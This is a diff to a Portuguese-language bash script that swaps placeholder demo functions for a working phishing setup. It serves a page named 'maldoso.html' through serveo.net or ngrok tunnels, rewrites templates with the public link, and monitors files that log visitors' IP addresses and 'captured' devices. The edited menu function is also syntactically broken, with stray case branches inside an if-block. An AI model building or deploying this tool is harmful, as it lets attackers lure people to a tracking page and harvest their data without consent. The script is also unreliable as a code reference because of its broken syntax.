@@ -124,44 +124,163 @@ EOF
   separator
 }
 
-# ================== MENU ==================
-menu() {
-  separator
+# ================== CONTROLE ==================
+stop() {
+pkill -f ngrok > /dev/null 2>&1
+pkill -f php > /dev/null 2>&1
+pkill -f ssh > /dev/null 2>&1
+exit 1
+}
+
+dependencies() {
+command -v php > /dev/null 2>&1 || {
+log "${ERR} PHP não está instalado. Abortando."
+exit 1
+}
+}
+
+catch_ip() {
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+success "IP registrado no sistema"
+cat ip.txt >> saved.ip.txt
+}
+
+checkfound() {
+log "${WAIT} Aguardando alvos... Ctrl + C para sair"
+while true; do
+  if [[ -e "ip.txt" ]]; then
+    success "IP registrado no sistema"
+    catch_ip
+    rm -rf ip.txt
+  fi
+  sleep 0.5
+  if [[ -e "Log.log" ]]; then
+    capture "Dispositivo ${GREEN}CAPTURADO${RESET} com sucesso"
+    rm -rf Log.log
+  fi
+  sleep 0.5
+done
+}
+
+server() {
+command -v ssh > /dev/null 2>&1 || {
+log "${ERR} SSH não está instalado. Abortando."
+exit 1
+}
+
+log "${INFO} Iniciando Serveo..."
+pkill -f php > /dev/null 2>&1
+
+if [[ $subdomain_resp == true ]]; then
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
+-R $subdomain:80:localhost:3333 serveo.net \
+2> /dev/null > sendlink &
+else
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
+-R 80:localhost:3333 serveo.net \
+2> /dev/null > sendlink &
+fi
+
+sleep 8
+log "${INFO} Iniciando servidor PHP (localhost:3333)..."
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+log "${OK} Link direto: ${GREEN}$send_link${RESET}"
+}
+
+payload() {
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+sed "s+forwarding_link+$send_link+g" maldoso.html > index2.html
+sed "s+forwarding_link+$send_link+g" template.php > index.php
+}
+
+payload_ngrok() {
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed "s+forwarding_link+$link+g" maldoso.html > index2.html
+sed "s+forwarding_link+$link+g" template.php > index.php
+}
+
+ngrok_server() {
+command -v unzip > /dev/null 2>&1 || exit 1
+command -v wget > /dev/null 2>&1 || exit 1
+
+if [[ ! -e ngrok ]]; then
+log "${INFO} Baixando ngrok..."
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+fi
+
+info "Iniciando servidor local"
+spinner
+wait_msg "Aguardando conexões"
+sleep 1.2
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+
+info "Iniciando servidor online"
+spinner
+./ngrok http 3333 > /dev/null 2>&1 &
+capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+log "${OK} Link direto: ${GREEN}$link${RESET}"
+
+payload_ngrok
+checkfound
+}
+
+start1() {
+rm -f sendlink
+separator
   printf "${GREEN}[01]${RESET} ${GRAY}Servidor Local (demo)${RESET}\n"
   printf "${GREEN}[02]${RESET} ${GRAY}Servidor Online (demo)${RESET}\n"
   printf "${GREEN}[00]${RESET} ${GRAY}Sair${RESET}\n"
   separator
   read -p "$(printf "${PURPLE}➜ Escolha uma opção: ${RESET}")" opt
+  option_server="${option_server:-1}"
 
-  case $opt in
-    1) demo_local ;;
-    2) demo_online ;;
-    0) exit 0 ;;
+if [[ $option_server -eq 1 ]]; then
+start
+elif [[ $option_server -eq 2 ]]; then
+ngrok_server
+else
+0) exit 0 ;;
     *) warn "Opção inválida"; sleep 1; menu ;;
   esac
+sleep 1
+clear
+start1
+fi
 }
 
-# ================== DEMOS ==================
-demo_local() {
-  info "Iniciando servidor local"
-  spinner
-  wait_msg "Aguardando conexões"
-  sleep 1.2
-  capture "Dispositivo ${GREEN}CAPTURADO${RESET} com sucesso"
-  success "IP registrado no sistema"
-  sleep 1
-  menu
-}
+start() {
+default_subdomain="maldoso$RANDOM"
+read -p "$(echo -e ${GRAY}'[+] Escolher subdomínio? [Y/n]: '${RESET})" choose_sub
+choose_sub="${choose_sub:-Y}"
 
-demo_online() {
-  info "Iniciando servidor online"
-  spinner
-  server_msg "Link gerado: ${GREEN}https://demo.server.net${RESET}"
-  wait_msg "Monitorando acessos remotos"
-  sleep 1.2
-  capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
-  sleep 1
-  menu
+if [[ $choose_sub =~ ^[Yy]$ ]]; then
+subdomain_resp=true
+read -p "$(echo -e ${GRAY}'[+] Subdomínio (default: '${default_subdomain}'):'${RESET})" subdomain
+subdomain="${subdomain:-$default_subdomain}"
+fi
+
+info "Iniciando servidor online"
+spinner
+server_msg "Link gerado: ${GREEN}https://demo.server.net${RESET}"
+wait_msg "Monitorando acessos remotos"
+sleep 1.2
+capture "Sessão ${GREEN}ESTABELECIDA${RESET}"
+sleep 1
+menu
+server
+payload
+checkfound
 }
 
 # ================== EXECUÇÃO ==================
@@ -171,3 +290,5 @@ glitch_text "Inicializando ambiente"
 spinner
 banner
 menu
+dependencies
+start1
